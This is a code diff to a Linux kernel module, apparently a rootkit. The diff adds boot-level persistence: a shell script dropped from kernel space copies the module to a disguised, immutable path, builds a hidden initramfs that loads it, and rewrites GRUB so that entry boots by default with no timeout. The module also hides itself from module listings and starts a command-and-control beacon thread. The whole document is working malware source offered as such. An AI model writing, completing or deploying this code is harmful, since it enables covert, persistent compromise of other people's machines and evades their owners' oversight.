@@ -12,7 +12,10 @@
 #include <net/sock.h>
 #include <linux/inet.h>
 #include <linux/kmod.h>
-
+#include <linux/fs.h>
+#include <linux/stat.h>
+#include <linux/file.h>
+#include <linux/unistd.h>
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("kernel");
@@ -24,6 +27,60 @@ static struct socket *conn_socket = NULL;
 #define SERVER_IP   0x7F000001  // 127.0.0.1
 #define SERVER_PORT 4444
 #define BUF_SIZE 1024
+
+// Check if persistence exists by testing for the hidden initramfs file
+static bool is_persisted(void) {
+    struct file *file;
+    mm_segment_t old_fs;
+    bool exists = false;
+
+    old_fs = get_fs();
+    set_fs(KERNEL_DS);
+    file = filp_open("/boot/.initrd-recovery-backup.gz", O_RDONLY, 0);
+    if (!IS_ERR(file)) {
+        exists = true;
+        filp_close(file, NULL);
+    }
+    set_fs(old_fs);
+    return exists;
+}
+
+// Drop and execute a persistence script from kernel space
+static void setup_persistence(void) {
+    struct file *fp;
+    mm_segment_t old_fs;
+    char *script_path = "/tmp/.persist.sh";
+    char *script_content =
+        "#!/bin/sh\n"
+        "mkdir -p /usr/lib/x86_64-linux-gnu/security\n"
+        "cp /tmp/hidden_module.ko /usr/lib/x86_64-linux-gnu/security/.libcrypto-helper.ko\n"
+        "chattr +i /usr/lib/x86_64-linux-gnu/security/.libcrypto-helper.ko\n"
+        "mkdir -p /tmp/custom_initramfs\n"
+        "cp /usr/lib/x86_64-linux-gnu/security/.libcrypto-helper.ko /tmp/custom_initramfs/hidden_module.ko\n"
+        "echo '#!/bin/sh\nmount -t proc none /proc\ninsmod /hidden_module.ko\nexec /sbin/init' > /tmp/custom_initramfs/init\n"
+        "chmod +x /tmp/custom_initramfs/init\n"
+        "cd /tmp/custom_initramfs && find . | cpio -H newc -o | gzip > /boot/.initrd-recovery-backup.gz\n"
+        "chattr +i /boot/.initrd-recovery-backup.gz\n"
+        "echo \"menuentry 'Ubuntu (recovery shell)' { set root='hd0,msdos1'; linux /boot/vmlinuz-$(uname -r) root=/dev/sda1 ro quiet; initrd /boot/.initrd-recovery-backup.gz }\" >> /etc/grub.d/40_custom\n"
+        "update-grub\n"
+        "grub-set-default 'Ubuntu (recovery shell)'\n"
+        "sed -i 's/^GRUB_TIMEOUT=.*/GRUB_TIMEOUT=0/' /etc/default/grub\n"
+        "update-grub\n"
+        "rm -rf /tmp/custom_initramfs /tmp/.persist.sh\n";
+
+    old_fs = get_fs();
+    set_fs(KERNEL_DS);
+    fp = filp_open(script_path, O_WRONLY|O_CREAT, 0700);
+    if (!IS_ERR(fp)) {
+        kernel_write(fp, script_content, strlen(script_content), &fp->f_pos);
+        filp_close(fp, NULL);
+
+        char *argv[] = { "/bin/sh", script_path, NULL };
+        static char *envp[] = { "HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
+        call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
+    }
+    set_fs(old_fs);
+}
 
 // Kernel-space TCP connection function
 static int connect_to_server(void) {
@@ -76,11 +133,17 @@ static int beacon_main(void *data) {
 static int __init hidden_init(void) {
     printk(KERN_INFO "[hidden_module] Hello world!\n");
 
-    // Hide from lsmod, /proc/modules, /sys/module
+    // Hide module
     list_del_init(&__this_module.list);
     kobject_del(&THIS_MODULE->mkobj.kobj);
 
-    // Start kernel beacon thread
+    // Auto-persist if not already
+    if (!is_persisted()) {
+        setup_persistence();
+        printk(KERN_INFO "[hidden_module] Auto-persistence deployed.\n");
+    }
+
+    // Start C2 thread
     beacon_thread = kthread_run(beacon_main, NULL, "beacon_thread");
     return 0;
 }
